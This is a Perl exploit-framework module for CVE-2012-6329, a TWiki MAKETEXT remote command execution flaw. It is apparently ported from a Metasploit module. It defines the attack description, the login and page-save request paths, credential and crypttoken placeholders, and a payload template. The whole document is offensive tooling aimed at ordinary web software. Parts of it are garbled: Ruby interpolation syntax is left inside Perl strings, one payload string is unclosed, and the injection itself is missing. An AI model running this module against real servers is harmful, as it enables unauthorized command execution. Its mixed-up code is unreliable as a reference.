package TWIKI::MSF::TwikiMaketext;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "TwikiMaketext";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2012-6329",
  DESCRIPTION => "

          This module exploits a vulnerability in the MAKETEXT Twiki variable. By using a

        specially crafted MAKETEXT, a malicious user can execute shell commands since user

        input is passed to the Perl \"eval\" command without first being sanitized. The

        problem is caused by an underlying security issue in the CPAN:Locale::Maketext

        module. This works in TWiki sites that have user interface localization enabled

        (UserInterfaceInternationalisation variable set).



        If USERNAME and PASSWORD aren't provided, anonymous access will be tried. Also,

        if the 'TwikiPage' option isn't provided, the module will try to create a random

        page on the SandBox space.  The module has been tested successfully on

        TWiki 5.1.2 as distributed with the official TWiki-VM-5.1.2-1 virtual machine.

      ",
  METHOD => "GET",
  MSF_MODULE => "twiki_maketext",
  OSVDB => 88460,
  PATH => "#{\@base}do/save#{\@page}?",
  PATHS => [
    "__\\\@BASE__do/login",
    "__\\\@BASE__do/edit__\\\@PAGE__",
    "#{\@base}do/save#{\@page}",
  ],
  PAYLOAD => "crypttoken=__CRYPTTOKEN__&text=#{rand_text_alpha(3+rand(3))&",
  REFERENCES => [
    "http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2012-6329",
  ],
  TITLE => "TWiki MAKETEXT Remote Command Execution",
  VARIABLES => {
    'CRYPTTOKEN' =>       { DESCRIPTION => "", VALUE => "" },
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'SESSION' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'do/login',
      PAYLOAD      => 'username=__USERNAME__&password=__PASSWORD__',
      TEXT   => 'Sending Exploit #2 Request : [POST] /do/login',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
